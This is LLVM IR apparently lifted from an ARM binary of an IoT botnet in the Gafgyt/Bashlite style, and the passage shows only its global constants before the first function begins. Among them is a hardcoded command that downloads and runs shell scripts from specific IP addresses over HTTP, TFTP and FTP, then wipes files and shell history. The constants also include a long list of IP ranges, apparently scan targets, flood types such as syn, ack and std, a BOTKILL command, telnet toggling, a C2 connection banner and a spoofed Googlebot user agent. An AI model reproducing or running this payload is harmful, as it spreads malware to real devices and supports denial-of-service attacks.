source_filename = "test"
target datalayout = "e-p:32:32:32-f80:32:32"

@r0 = internal unnamed_addr global i32 0
@r1 = internal unnamed_addr global i32 0
@r2 = internal unnamed_addr global i32 0
@r3 = internal unnamed_addr global i32 0
@r4 = internal unnamed_addr global i32 0
@r5 = internal unnamed_addr global i32 0
@r6 = internal unnamed_addr global i32 0
@r7 = internal unnamed_addr global i32 0
@r8 = internal unnamed_addr global i32 0
@sb = internal unnamed_addr global i32 0
@sl = internal unnamed_addr global i32 0
@fp = internal unnamed_addr global i32 0
@ip = internal unnamed_addr global i32 0
@sp = internal unnamed_addr global i32 0
@lr = internal unnamed_addr global i32 0
@cpsr_n = internal unnamed_addr global i1 false
@cpsr_z = internal unnamed_addr global i1 false
@cpsr_c = internal unnamed_addr global i1 false
@cpsr_v = internal unnamed_addr global i1 false
@0 = external global i32
@global_var_11984.3 = constant i32 -509558771
@global_var_2c8ac.6 = global i32 0
@global_var_2c8b0.7 = local_unnamed_addr global i32 0
@global_var_2c8b4.8 = local_unnamed_addr global i32 0
@global_var_20ed8.16 = constant [7 x i8] c"(null)\00"
@global_var_308ac.18 = local_unnamed_addr global i32 0
@global_var_20ee0.20 = constant [8 x i8] c"/bin/sh\00"
@global_var_20908.22 = constant [3 x i8] c"sh\00"
@global_var_20ee8.24 = constant [3 x i8] c"-c\00"
@global_var_20eec.27 = constant i32 -1
@global_var_212ec.29 = constant [14 x i8] c"/proc/cpuinfo\00"
@global_var_212fc.31 = constant [9 x i8] c"BOGOMIPS\00"
@global_var_2c890.36 = global i32 0
@global_var_21308.38 = constant [5 x i8] c"PING\00"
@global_var_21310.40 = constant [14 x i8] c"gethostbyname\00"
@global_var_2c898.42 = global i32 0
@global_var_2c89c.43 = local_unnamed_addr global i32 0
@global_var_32af8.45 = global i32 0
@global_var_21320.47 = constant [6 x i8] c":>%$#\00"
@global_var_2c8a6.49 = global i32 0
@global_var_2c8a7.50 = local_unnamed_addr global i32 0
@global_var_2c8a8.51 = local_unnamed_addr global i32 0
@global_var_21328.57 = constant [11 x i8] c"1.10.%d.%d\00"
@global_var_21334.59 = constant [12 x i8] c"1.120.%d.%d\00"
@global_var_21340.61 = constant [12 x i8] c"5.140.%d.%d\00"
@global_var_2134c.63 = constant [12 x i8] c"5.141.%d.%d\00"
@global_var_21358.65 = constant [12 x i8] c"122.2.%d.%d\00"
@global_var_21364.67 = constant [12 x i8] c"122.3.%d.%d\00"
@global_var_21370.69 = constant [13 x i8] c"122.53.%d.%d\00"
@global_var_21380.71 = constant [13 x i8] c"122.54.%d.%d\00"
@global_var_21390.73 = constant [13 x i8] c"188.16.%d.%d\00"
@global_var_213a0.75 = constant [13 x i8] c"188.17.%d.%d\00"
@global_var_213b0.77 = constant [13 x i8] c"188.18.%d.%d\00"
@global_var_213c0.79 = constant [13 x i8] c"188.19.%d.%d\00"
@global_var_213d0.81 = constant [13 x i8] c"31.162.%d.%d\00"
@global_var_213e0.83 = constant [13 x i8] c"31.163.%d.%d\00"
@global_var_213f0.85 = constant [12 x i8] c"5.142.%d.%d\00"
@global_var_213fc.87 = constant [12 x i8] c"5.143.%d.%d\00"
@global_var_21408.89 = constant [13 x i8] c"90.150.%d.%d\00"
@global_var_21418.91 = constant [13 x i8] c"90.151.%d.%d\00"
@global_var_21428.93 = constant [13 x i8] c"178.47.%d.%d\00"
@global_var_21438.95 = constant [12 x i8] c"94.50.%d.%d\00"
@global_var_21444.97 = constant [12 x i8] c"94.51.%d.%d\00"
@global_var_21450.99 = constant [13 x i8] c"190.43.%d.%d\00"
@global_var_21460.101 = constant [12 x i8] c"210.5.%d.%d\00"
@global_var_2146c.103 = constant [14 x i8] c"210.213.%d.%d\00"
@global_var_2147c.105 = constant [11 x i8] c"27.0.%d.%d\00"
@global_var_21488.107 = constant [11 x i8] c"27.8.%d.%d\00"
@global_var_21494.109 = constant [12 x i8] c"27.50.%d.%d\00"
@global_var_214a0.111 = constant [12 x i8] c"27.54.%d.%d\00"
@global_var_214ac.113 = constant [12 x i8] c"27.98.%d.%d\00"
@global_var_214b8.115 = constant [13 x i8] c"27.112.%d.%d\00"
@global_var_214c8.117 = constant [13 x i8] c"27.192.%d.%d\00"
@global_var_214d8.119 = constant [14 x i8] c"186.128.%d.%d\00"
@global_var_214e8.121 = constant [14 x i8] c"186.132.%d.%d\00"
@global_var_214f8.123 = constant [13 x i8] c"186.39.%d.%d\00"
@global_var_21508.125 = constant [13 x i8] c"186.56.%d.%d\00"
@global_var_21518.127 = constant [13 x i8] c"186.57.%d.%d\00"
@global_var_21528.129 = constant [13 x i8] c"186.58.%d.%d\00"
@global_var_21538.131 = constant [13 x i8] c"186.60.%d.%d\00"
@global_var_21548.133 = constant [13 x i8] c"46.181.%d.%d\00"
@global_var_21558.135 = constant [13 x i8] c"46.180.%d.%d\00"
@global_var_21568.137 = constant [14 x i8] c"188.173.%d.%d\00"
@global_var_21578.139 = constant [13 x i8] c"64.137.%d.%d\00"
@global_var_21588.141 = constant [13 x i8] c"103.20.%d.%d\00"
@global_var_21598.143 = constant [13 x i8] c"103.47.%d.%d\00"
@global_var_215a8.145 = constant [13 x i8] c"103.57.%d.%d\00"
@global_var_215b8.147 = constant [13 x i8] c"103.30.%d.%d\00"
@global_var_215c8.149 = constant [13 x i8] c"103.54.%d.%d\00"
@global_var_215d8.151 = constant [14 x i8] c"103.204.%d.%d\00"
@global_var_215e8.153 = constant [13 x i8] c"103.44.%d.%d\00"
@global_var_215f8.155 = constant [14 x i8] c"103.198.%d.%d\00"
@global_var_21608.157 = constant [14 x i8] c"103.203.%d.%d\00"
@global_var_21618.159 = constant [14 x i8] c"103.220.%d.%d\00"
@global_var_21628.161 = constant [14 x i8] c"103.242.%d.%d\00"
@global_var_21638.163 = constant [13 x i8] c"103.14.%d.%d\00"
@global_var_21648.165 = constant [14 x i8] c"103.195.%d.%d\00"
@global_var_21658.167 = constant [14 x i8] c"103.214.%d.%d\00"
@global_var_21668.169 = constant [14 x i8] c"103.218.%d.%d\00"
@global_var_21678.171 = constant [14 x i8] c"103.225.%d.%d\00"
@global_var_21688.173 = constant [14 x i8] c"103.228.%d.%d\00"
@global_var_21698.175 = constant [14 x i8] c"103.231.%d.%d\00"
@global_var_216a8.177 = constant [13 x i8] c"103.60.%d.%d\00"
@global_var_216b8.179 = constant [14 x i8] c"103.248.%d.%d\00"
@global_var_216c8.181 = constant [14 x i8] c"103.253.%d.%d\00"
@global_var_216d8.183 = constant [14 x i8] c"103.255.%d.%d\00"
@global_var_216e8.185 = constant [13 x i8] c"103.35.%d.%d\00"
@global_var_216f8.187 = constant [13 x i8] c"103.49.%d.%d\00"
@global_var_21708.189 = constant [13 x i8] c"103.62.%d.%d\00"
@global_var_21718.191 = constant [12 x i8] c"98.27.%d.%d\00"
@global_var_21724.193 = constant [13 x i8] c"98.179.%d.%d\00"
@global_var_21734.195 = constant [13 x i8] c"98.113.%d.%d\00"
@global_var_21744.197 = constant [13 x i8] c"98.121.%d.%d\00"
@global_var_21754.200 = constant [13 x i8] c"98.100.%d.%d\00"
@global_var_21764.202 = constant [13 x i8] c"98.161.%d.%d\00"
@global_var_21774.204 = constant [13 x i8] c"98.165.%d.%d\00"
@global_var_21784.206 = constant [12 x i8] c"112.5.%d.%d\00"
@global_var_21790.208 = constant [14 x i8] c"117.165.%d.%d\00"
@global_var_217a0.210 = constant [11 x i8] c"85.3.%d.%d\00"
@global_var_217ac.212 = constant [13 x i8] c"37.158.%d.%d\00"
@global_var_217bc.214 = constant [11 x i8] c"95.9.%d.%d\00"
@global_var_217c8.216 = constant [13 x i8] c"41.252.%d.%d\00"
@global_var_217d8.218 = constant [12 x i8] c"58.71.%d.%d\00"
@global_var_217e4.220 = constant [13 x i8] c"104.55.%d.%d\00"
@global_var_217f4.222 = constant [13 x i8] c"78.186.%d.%d\00"
@global_var_21804.224 = constant [13 x i8] c"78.189.%d.%d\00"
@global_var_21814.226 = constant [14 x i8] c"221.120.%d.%d\00"
@global_var_21824.228 = constant [11 x i8] c"88.5.%d.%d\00"
@global_var_21830.230 = constant [13 x i8] c"41.254.%d.%d\00"
@global_var_21840.232 = constant [13 x i8] c"45.117.%d.%d\00"
@global_var_21850.234 = constant [13 x i8] c"101.51.%d.%d\00"
@global_var_21860.236 = constant [13 x i8] c"137.59.%d.%d\00"
@global_var_21870.238 = constant [11 x i8] c"1.56.%d.%d\00"
@global_var_2187c.240 = constant [12 x i8] c"1.188.%d.%d\00"
@global_var_21888.242 = constant [13 x i8] c"14.204.%d.%d\00"
@global_var_21898.244 = constant [12 x i8] c"36.32.%d.%d\00"
@global_var_218a4.246 = constant [13 x i8] c"36.248.%d.%d\00"
@global_var_218b4.248 = constant [12 x i8] c"39.64.%d.%d\00"
@global_var_218c0.250 = constant [11 x i8] c"42.4.%d.%d\00"
@global_var_218cc.252 = constant [12 x i8] c"42.48.%d.%d\00"
@global_var_218d8.254 = constant [12 x i8] c"42.52.%d.%d\00"
@global_var_218e4.256 = constant [12 x i8] c"42.56.%d.%d\00"
@global_var_218f0.258 = constant [12 x i8] c"42.63.%d.%d\00"
@global_var_218fc.260 = constant [12 x i8] c"42.84.%d.%d\00"
@global_var_21908.262 = constant [13 x i8] c"42.176.%d.%d\00"
@global_var_21918.264 = constant [13 x i8] c"42.224.%d.%d\00"
@global_var_21928.266 = constant [13 x i8] c"43.253.%d.%d\00"
@global_var_21938.268 = constant [13 x i8] c"43.230.%d.%d\00"
@global_var_21948.270 = constant [13 x i8] c"163.53.%d.%d\00"
@global_var_21958.272 = constant [13 x i8] c"62.252.%d.%d\00"
@global_var_21968.274 = constant [13 x i8] c"43.245.%d.%d\00"
@global_var_21978.276 = constant [13 x i8] c"62.255.%d.%d\00"
@global_var_21988.278 = constant [12 x i8] c"77.96.%d.%d\00"
@global_var_21994.280 = constant [12 x i8] c"77.97.%d.%d\00"
@global_var_219a0.282 = constant [12 x i8] c"77.98.%d.%d\00"
@global_var_219ac.284 = constant [13 x i8] c"77.100.%d.%d\00"
@global_var_219bc.286 = constant [13 x i8] c"77.102.%d.%d\00"
@global_var_219cc.288 = constant [14 x i8] c"113.191.%d.%d\00"
@global_var_219dc.290 = constant [13 x i8] c"81.100.%d.%d\00"
@global_var_219ec.292 = constant [14 x i8] c"113.188.%d.%d\00"
@global_var_219fc.294 = constant [14 x i8] c"113.189.%d.%d\00"
@global_var_21a0c.296 = constant [13 x i8] c"94.174.%d.%d\00"
@global_var_21a1c.298 = constant [13 x i8] c"14.160.%d.%d\00"
@global_var_21a2c.300 = constant [13 x i8] c"14.161.%d.%d\00"
@global_var_21a3c.302 = constant [13 x i8] c"14.162.%d.%d\00"
@global_var_21a4c.304 = constant [13 x i8] c"14.163.%d.%d\00"
@global_var_21a5c.306 = constant [13 x i8] c"14.164.%d.%d\00"
@global_var_21a6c.308 = constant [13 x i8] c"14.165.%d.%d\00"
@global_var_21a7c.310 = constant [13 x i8] c"14.166.%d.%d\00"
@global_var_21a8c.312 = constant [13 x i8] c"14.167.%d.%d\00"
@global_var_21a9c.314 = constant [13 x i8] c"14.168.%d.%d\00"
@global_var_21aac.316 = constant [13 x i8] c"14.169.%d.%d\00"
@global_var_21abc.318 = constant [13 x i8] c"14.170.%d.%d\00"
@global_var_21acc.320 = constant [13 x i8] c"14.171.%d.%d\00"
@global_var_21adc.322 = constant [13 x i8] c"14.172.%d.%d\00"
@global_var_21aec.324 = constant [13 x i8] c"14.173.%d.%d\00"
@global_var_21afc.326 = constant [13 x i8] c"14.174.%d.%d\00"
@global_var_21b0c.328 = constant [13 x i8] c"14.175.%d.%d\00"
@global_var_21b1c.330 = constant [13 x i8] c"14.176.%d.%d\00"
@global_var_21b2c.332 = constant [13 x i8] c"14.177.%d.%d\00"
@global_var_21b3c.334 = constant [13 x i8] c"14.178.%d.%d\00"
@global_var_21b4c.336 = constant [13 x i8] c"14.179.%d.%d\00"
@global_var_21b5c.338 = constant [13 x i8] c"14.180.%d.%d\00"
@global_var_21b6c.340 = constant [13 x i8] c"14.181.%d.%d\00"
@global_var_21b7c.342 = constant [13 x i8] c"14.182.%d.%d\00"
@global_var_21b8c.344 = constant [13 x i8] c"14.183.%d.%d\00"
@global_var_21b9c.346 = constant [13 x i8] c"14.184.%d.%d\00"
@global_var_21bac.348 = constant [13 x i8] c"14.185.%d.%d\00"
@global_var_21bbc.350 = constant [13 x i8] c"14.186.%d.%d\00"
@global_var_21bcc.352 = constant [13 x i8] c"14.187.%d.%d\00"
@global_var_21bdc.354 = constant [13 x i8] c"14.188.%d.%d\00"
@global_var_21bec.357 = constant [13 x i8] c"14.189.%d.%d\00"
@global_var_21bfc.359 = constant [13 x i8] c"14.190.%d.%d\00"
@global_var_21c0c.361 = constant [13 x i8] c"14.191.%d.%d\00"
@global_var_21c1c.363 = constant [13 x i8] c"45.121.%d.%d\00"
@global_var_21c2c.365 = constant [13 x i8] c"45.120.%d.%d\00"
@global_var_21c3c.367 = constant [13 x i8] c"45.115.%d.%d\00"
@global_var_21c4c.369 = constant [13 x i8] c"43.252.%d.%d\00"
@global_var_21c5c.371 = constant [13 x i8] c"43.240.%d.%d\00"
@global_var_21c6c.373 = constant [13 x i8] c"41.174.%d.%d\00"
@global_var_21c7c.375 = constant [13 x i8] c"49.118.%d.%d\00"
@global_var_21c8c.377 = constant [13 x i8] c"78.188.%d.%d\00"
@global_var_21c9c.379 = constant [13 x i8] c"45.127.%d.%d\00"
@global_var_21cac.381 = constant [12 x i8] c"14.33.%d.%d\00"
@global_var_21cb8.383 = constant [13 x i8] c"123.16.%d.%d\00"
@global_var_21cc8.385 = constant [13 x i8] c"202.44.%d.%d\00"
@global_var_21cd8.387 = constant [13 x i8] c"116.93.%d.%d\00"
@global_var_21ce8.389 = constant [12 x i8] c"91.83.%d.%d\00"
@global_var_21cf4.391 = constant [13 x i8] c"41.253.%d.%d\00"
@global_var_21d04.393 = constant [14 x i8] c"117.173.%d.%d\00"
@global_var_21d14.395 = constant [14 x i8] c"113.190.%d.%d\00"
@global_var_21d24.397 = constant [13 x i8] c"146.88.%d.%d\00"
@global_var_21d34.399 = constant [14 x i8] c"112.196.%d.%d\00"
@global_var_21d44.401 = constant [14 x i8] c"113.178.%d.%d\00"
@global_var_21d54.403 = constant [13 x i8] c"112.45.%d.%d\00"
@global_var_21d64.405 = constant [14 x i8] c"183.223.%d.%d\00"
@global_var_21d74.407 = constant [13 x i8] c"116.71.%d.%d\00"
@global_var_21d84.409 = constant [14 x i8] c"110.235.%d.%d\00"
@global_var_21d94.411 = constant [14 x i8] c"124.253.%d.%d\00"
@global_var_21da4.413 = constant [14 x i8] c"211.237.%d.%d\00"
@global_var_21db4.415 = constant [14 x i8] c"117.175.%d.%d\00"
@global_var_21dc4.417 = constant [13 x i8] c"178.93.%d.%d\00"
@global_var_21dd4.419 = constant [12 x i8] c"111.9.%d.%d\00"
@global_var_21de0.421 = constant [14 x i8] c"222.252.%d.%d\00"
@global_var_21df0.423 = constant [14 x i8] c"113.174.%d.%d\00"
@global_var_21e00.425 = constant [14 x i8] c"113.160.%d.%d\00"
@global_var_21e10.427 = constant [14 x i8] c"113.161.%d.%d\00"
@global_var_21e20.429 = constant [14 x i8] c"113.162.%d.%d\00"
@global_var_21e30.431 = constant [14 x i8] c"113.163.%d.%d\00"
@global_var_21e40.433 = constant [14 x i8] c"113.164.%d.%d\00"
@global_var_21e50.435 = constant [14 x i8] c"113.165.%d.%d\00"
@global_var_21e60.437 = constant [14 x i8] c"113.166.%d.%d\00"
@global_var_21e70.439 = constant [14 x i8] c"116.167.%d.%d\00"
@global_var_21e80.441 = constant [14 x i8] c"113.168.%d.%d\00"
@global_var_21e90.443 = constant [13 x i8] c"113.17.%d.%d\00"
@global_var_21ea0.445 = constant [13 x i8] c"123.18.%d.%d\00"
@global_var_21eb0.447 = constant [13 x i8] c"123.19.%d.%d\00"
@global_var_21ec0.449 = constant [13 x i8] c"123.20.%d.%d\00"
@global_var_21ed0.451 = constant [13 x i8] c"123.21.%d.%d\00"
@global_var_21ee0.453 = constant [13 x i8] c"123.22.%d.%d\00"
@global_var_21ef0.455 = constant [14 x i8] c"222.253.%d.%d\00"
@global_var_21f00.457 = constant [14 x i8] c"222.254.%d.%d\00"
@global_var_21f10.459 = constant [14 x i8] c"222.225.%d.%d\00"
@global_var_21f20.461 = constant [13 x i8] c"37.247.%d.%d\00"
@global_var_21f30.463 = constant [13 x i8] c"41.208.%d.%d\00"
@global_var_21f40.465 = constant [14 x i8] c"183.220.%d.%d\00"
@global_var_21f50.467 = constant [14 x i8] c"175.201.%d.%d\00"
@global_var_21f60.469 = constant [13 x i8] c"50.205.%d.%d\00"
@global_var_21f70.471 = constant [13 x i8] c"88.248.%d.%d\00"
@global_var_21f80.473 = constant [13 x i8] c"88.105.%d.%d\00"
@global_var_21f90.475 = constant [13 x i8] c"88.247.%d.%d\00"
@global_var_21fa0.477 = constant [13 x i8] c"85.105.%d.%d\00"
@global_var_21fb0.479 = constant [12 x i8] c"188.3.%d.%d\00"
@global_var_21fbc.481 = constant [13 x i8] c"103.55.%d.%d\00"
@global_var_21fcc.483 = constant [14 x i8] c"103.233.%d.%d\00"
@global_var_21fdc.485 = constant [13 x i8] c"103.63.%d.%d\00"
@global_var_21fec.487 = constant [13 x i8] c"144.48.%d.%d\00"
@global_var_21ffc.489 = constant [13 x i8] c"163.47.%d.%d\00"
@global_var_2200c.491 = constant [13 x i8] c"223.29.%d.%d\00"
@global_var_2201c.493 = constant [13 x i8] c"59.153.%d.%d\00"
@global_var_2202c.495 = constant [14 x i8] c"113.176.%d.%d\00"
@global_var_2203c.497 = constant [14 x i8] c"113.175.%d.%d\00"
@global_var_2204c.499 = constant [14 x i8] c"113.177.%d.%d\00"
@global_var_2205c.501 = constant [14 x i8] c"113.183.%d.%d\00"
@global_var_2206c.503 = constant [14 x i8] c"202.164.%d.%d\00"
@global_var_2207c.505 = constant [14 x i8] c"202.134.%d.%d\00"
@global_var_2208c.507 = constant [13 x i8] c"210.56.%d.%d\00"
@global_var_2209c.509 = constant [13 x i8] c"49.156.%d.%d\00"
@global_var_220ac.511 = constant [14 x i8] c"203.210.%d.%d\00"
@global_var_220bc.514 = constant [14 x i8] c"117.181.%d.%d\00"
@global_var_220cc.516 = constant [14 x i8] c"117.177.%d.%d\00"
@global_var_220dc.518 = constant [14 x i8] c"117.178.%d.%d\00"
@global_var_220ec.520 = constant [14 x i8] c"117.176.%d.%d\00"
@global_var_220fc.522 = constant [14 x i8] c"117.170.%d.%d\00"
@global_var_2210c.524 = constant [14 x i8] c"117.171.%d.%d\00"
@global_var_2211c.526 = constant [14 x i8] c"117.162.%d.%d\00"
@global_var_2212c.528 = constant [13 x i8] c"112.26.%d.%d\00"
@global_var_2213c.530 = constant [13 x i8] c"112.27.%d.%d\00"
@global_var_2214c.532 = constant [13 x i8] c"112.28.%d.%d\00"
@global_var_2215c.534 = constant [13 x i8] c"112.29.%d.%d\00"
@global_var_2216c.536 = constant [13 x i8] c"112.30.%d.%d\00"
@global_var_2217c.538 = constant [13 x i8] c"112.31.%d.%d\00"
@global_var_2218c.540 = constant [14 x i8] c"203.150.%d.%d\00"
@global_var_2219c.542 = constant [13 x i8] c"50.233.%d.%d\00"
@global_var_221ac.544 = constant [13 x i8] c"27.255.%d.%d\00"
@global_var_221bc.546 = constant [13 x i8] c"123.24.%d.%d\00"
@global_var_221cc.548 = constant [13 x i8] c"123.25.%d.%d\00"
@global_var_221dc.550 = constant [13 x i8] c"111.26.%d.%d\00"
@global_var_221ec.552 = constant [13 x i8] c"111.20.%d.%d\00"
@global_var_32aec.554 = global i32 0
@global_var_221fc.558 = constant [3 x i8] c"\0D\0A\00"
@global_var_22200.563 = constant i32 926112539
@global_var_22240.565 = constant [485 x i8] c"cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://185.101.107.128/bins.sh; curl -O http://185.158.113.30/bins.sh; chmod 777 bins.sh; sh bins.sh; tftp 185.158.113.30 -c get tftp1.sh; chmod 777 tftp1.sh; sh tftp1.sh; tftp -r tftp2.sh -g 185.158.113.30; chmod 777 tftp2.sh; sh tftp2.sh; ftpget -v -u anonymous -p anonymous -P 21 185.158.113.30 ftp1.sh ftp1.sh; sh ftp1.sh; rm -rf bins.sh tftp1.sh tftp2.sh ftp1.sh; rm -rf *;history -c;history -w;rm -rf ~/.bash_history\0D\0A\00"
@global_var_22428.567 = constant [10 x i8] c"pkill -9 \00"
@global_var_22434.570 = constant [11 x i8] c"pkill -9 \22\00"
@global_var_22440.572 = constant i32 34
@global_var_22444.574 = constant [6 x i8] c"close\00"
@global_var_2244c.575 = constant [11 x i8] c"keep-alive\00"
@global_var_22458.576 = constant [7 x i8] c"accept\00"
@global_var_22460.577 = constant [3 x i8*] [i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_22444.574, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @global_var_2244c.575, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_22458.576, i32 0, i32 0)]
@global_var_10328.582 = constant i32 180696
@global_var_2246c.584 = constant [62 x i8] c"%s %s HTTP/1.1\0D\0AConnection: %s\0D\0AAccept: */*\0D\0AUser-Agent: %s\0D\0A\00"
@global_var_224ac.586 = constant [4 x i8] c"all\00"
@global_var_224b0.588 = constant i32 44
@global_var_224b4.590 = constant [4 x i8] c"syn\00"
@global_var_224b8.592 = constant [4 x i8] c"rst\00"
@global_var_224bc.594 = constant [4 x i8] c"fin\00"
@global_var_224c0.596 = constant [4 x i8] c"ack\00"
@global_var_224c4.598 = constant [4 x i8] c"psh\00"
@global_var_224c8.600 = constant [4 x i8] c"std\00"
@global_var_224cc.604 = constant [6 x i8] c"PONG!\00"
@global_var_224d4.606 = constant [7 x i8] c"TELNET\00"
@global_var_224dc.608 = constant [16 x i8] c"TELNET ON | OFF\00"
@global_var_224ec.610 = constant [4 x i8] c"OFF\00"
@global_var_32af4.612 = global i32 0
@global_var_224f0.614 = constant [13 x i8] c"[TELNET] OFF\00"
@global_var_22500.616 = constant [3 x i8] c"ON\00"
@global_var_22504.618 = constant [12 x i8] c"[TELNET] ON\00"
@global_var_22510.620 = constant [8 x i8] c"BOTKILL\00"
@global_var_22518.623 = constant [13 x i8] c"Killing - %s\00"
@global_var_22528.625 = constant [4 x i8] c"TCP\00"
@global_var_2252c.628 = constant [4 x i8] c"STD\00"
@global_var_22530.630 = constant [4 x i8] c"GHP\00"
@global_var_22534.632 = constant [9 x i8] c"KILLATTK\00"
@global_var_22540.636 = constant [15 x i8] c"URSTRAITKANCER\00"
@global_var_22550.642 = constant [8 x i8] c"8.8.8.8\00"
@global_var_22558.645 = constant [16 x i8] c"/proc/net/route\00"
@global_var_22568.647 = constant [11 x i8] c"\0900000000\09\00"
@global_var_2c8a0.649 = global i32 0
@global_var_22574.651 = constant [6 x i8] c"ARM-4\00"
@global_var_2257c.653 = constant [16 x i8] c"/usr/bin/python\00"
@global_var_2258c.655 = constant [7 x i8] c"SERVER\00"
@global_var_22594.657 = constant [7 x i8] c"ROUTER\00"
@global_var_2259c.659 = constant i32 0
@global_var_208cc.662 = constant [5 x i8] c"sshd\00"
@global_var_225a0.664 = constant [19 x i8] c"/usr/sbin/dropbear\00"
@global_var_225b4.667 = constant i32 47
@global_var_225b8.671 = constant [43 x i8] c"[ %s CONNECTED ] [ %s: ] [ Arch Type: %s ]\00"
@global_var_225e4.676 = constant [5 x i8] c"PONG\00"
@global_var_225ec.678 = constant [4 x i8] c"DUP\00"
@global_var_225f0.680 = constant [5 x i8] c"MOVE\00"
@global_var_225f8.682 = constant [8 x i8] c"%s 2>&1\00"
@1 = constant [3 x i32] %wide-string
@global_var_22604.686 = constant i32 32
@global_var_32ac0.693 = global i32 0
@global_var_22c08.698 = constant i32 0
@global_var_12d98.699 = constant i32 -382910448
@global_var_18124.700 = constant i32 -382909968
@global_var_184e0.701 = constant i32 -382910224
@global_var_22c30.704 = constant i32 2949163
@global_var_22c28.706 = constant [7 x i8] c"(null)\00"
@global_var_32b24.708 = global i32 0
@global_var_22c3c.712 = constant i32 135270416
@global_var_22c82.717 = constant i32 327688
@global_var_22c9a.718 = constant i32 16843008
@global_var_22cc0.723 = constant [8 x i8] c" +0-#'I\00"
@global_var_22c44.727 = constant [9 x i8] c"hlLjztqZ\00"
@global_var_22ca8.729 = constant [21 x i8] c"npxXoudifFeEgGaACScs\00"
@global_var_22c78.731 = constant i32 252117248
@global_var_22c77.732 = constant i32 117506048
@global_var_22c68.734 = constant i32 331776
@global_var_22c58.736 = constant i32 335616
@global_var_32afc.739 = global i32 0
@global_var_13f4c.740 = constant i32 -456978431
@global_var_328c4.747 = global i32 0
@global_var_22cd8.750 = constant [8 x i8] c"Success\00"
@global_var_238a8.757 = constant [15 x i8] c"Resolver error\00"
@global_var_238b8.761 = constant [3 x i8] c": \00"
@global_var_238ba.762 = constant i32 0
@global_var_23834.767 = constant [8 x i8] c"%s%s%s\0A\00"
@global_var_17800.769 = constant i32 84164
@global_var_328c8.771 = global i32 0
@global_var_328d8.775 = global i32 0
@global_var_14d28.791 = constant i32 -478871519
@global_var_1569c.800 = constant i32 -382906384
@global_var_32aa4.808 = local_unnamed_addr global i32 0
@global_var_12a34.810 = constant i32 -509591552
@global_var_15c5c.816 = constant i32 -442564540
@global_var_238bc.842 = constant i32 0
@global_var_1f31d.847 = constant [72 x i8] c"ozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)\00"
@global_var_32aa8.858 = local_unnamed_addr global i32 0
@global_var_12cc4.861 = constant i32 -382909968
@global_var_16504.862 = constant i32 -494075872
@global_var_12a60.863 = constant i32 -382910336
@global_var_238e4.867 = constant [11 x i8] c"/proc/stat\00"
@global_var_238f0.870 = constant i32 32
@global_var_238f4.873 = constant [14 x i8] c"/proc/cpuinfo\00"
@global_var_23904.875 = constant [10 x i8] c"processor\00"
@global_var_23928.877 = constant i32 604672
@global_var_15968.880 = constant i32 436207627
@global_var_166c4.881 = constant i32 -369098421
@global_var_32ab8.897 = local_unnamed_addr global i32 0
@global_var_32abc.899 = local_unnamed_addr global i32 0
@global_var_15210.901 = constant [3 x i8] c"1\08\00"
@global_var_2392c.903 = constant [10 x i8] c"/dev/null\00"
@global_var_15acc.904 = constant i32 -442543860
@global_var_151d0.906 = constant i32 973078578
@global_var_12c28.910 = constant i32 -382910352
@global_var_14000.915 = constant i32 -369093074
@global_var_1713c.928 = constant i32 -335545171
@global_var_23944.933 = constant [3 x i8] c"-c\00"
@global_var_23938.934 = constant [8 x i8] c"/bin/sh\00"
@global_var_23940.935 = constant [3 x i8] c"sh\00"
@global_var_32ac8.943 = local_unnamed_addr global i32 0
@global_var_176d0.949 = constant i32 -443088884
@global_var_32ac4.965 = global i32 0
@global_var_15850.966 = constant i32 -382909968
@global_var_2390c.969 = constant i32 114
@global_var_194e0.974 = constant i32 -382906384
@global_var_20003.983 = constant [18 x i8] c"821 BonEcho/2.0b2\00"
@global_var_20000.984 = constant [21 x i8] c"060821 BonEcho/2.0b2\00"
@global_var_18480.994 = constant i32 -509607926
@global_var_136dc.996 = constant i32 -481099768
@global_var_23c60.1000 = constant [4 x i8] c"inf\00"
@global_var_23c78.1003 = constant i32 0
@global_var_23c63.1006 = constant i32 1179535616
@global_var_23c70.1007 = constant i32 2883630
@global_var_19304.1022 = constant i32 -509607928
@global_var_12cb8.1025 = constant i32 -516948194
@global_var_1a7cc.1068 = constant i32 -478805983
@global_var_23cc4.1083 = constant [17 x i8] c"0123456789abcdef\00"
@global_var_23cc0.1087 = constant [3 x i8] c"%x\00"
@global_var_12a98.1100 = constant i32 -382910336
@global_var_32acc.1103 = local_unnamed_addr global i32 0
@global_var_32ee0.1105 = local_unnamed_addr global i32 0
@global_var_32edc.1107 = local_unnamed_addr global i32 0
@global_var_1c1fc.1110 = constant i32 -442695584
@global_var_32ed4.1117 = local_unnamed_addr global i32 0
@global_var_23cd8.1119 = constant [17 x i8] c"/etc/resolv.conf\00"
@global_var_32ae8.1121 = local_unnamed_addr global i32 0
@global_var_23d10.1129 = constant [8 x i8] c"timeout\00"
@global_var_23d18.1131 = constant [9 x i8] c"attempts\00"
@global_var_23cec.1133 = constant [11 x i8] c"nameserver\00"
@global_var_23cf8.1135 = constant [7 x i8] c"domain\00"
@global_var_23d00.1137 = constant [7 x i8] c"search\00"
@global_var_23d08.1139 = constant [8 x i8] c"options\00"
@global_var_23d24.1142 = constant i32 889192450
@global_var_f84c.1144 = constant i32 167772195
@global_var_1ad58.1150 = constant i32 -382909456
@global_var_23d34.1153 = constant [11 x i8] c"/etc/hosts\00"
@global_var_23d40.1156 = constant [4 x i8] c"# \09\00"
@global_var_1d680.1160 = constant i32 -504313148
@global_var_1d668.1161 = constant i32 -483131392
@global_var_1d514.1162 = constant i32 -481229311
@global_var_1d6f0.1163 = constant i32 -477817729
@global_var_1da2c.1164 = constant i32 -516685812
@global_var_1d920.1165 = constant i32 -905969571
@global_var_1d854.1166 = constant i32 -528203771
@global_var_1dab4.1167 = constant i32 -478079873
@global_var_1da98.1168 = constant i32 -534704125
@global_var_1da48.1169 = constant i32 -534704125
@global_var_1d9e0.1170 = constant i32 -483131392
@global_var_2c8a9.52 = local_unnamed_addr global i8 0
@global_var_2c8aa.53 = local_unnamed_addr global i8 0
@global_var_32ee4.1101 = local_unnamed_addr global i8 0
@global_var_32ed8.1102 = local_unnamed_addr global i8 0
@global_var_22600.684 = constant [2 x i8] c"r\00"

declare void @__pseudo_branch(i32) local_unnamed_addr

declare void @__pseudo_cond_branch(i1, i32) local_unnamed_addr

define i32 @function_80b4() local_unnamed_addr {
entry:
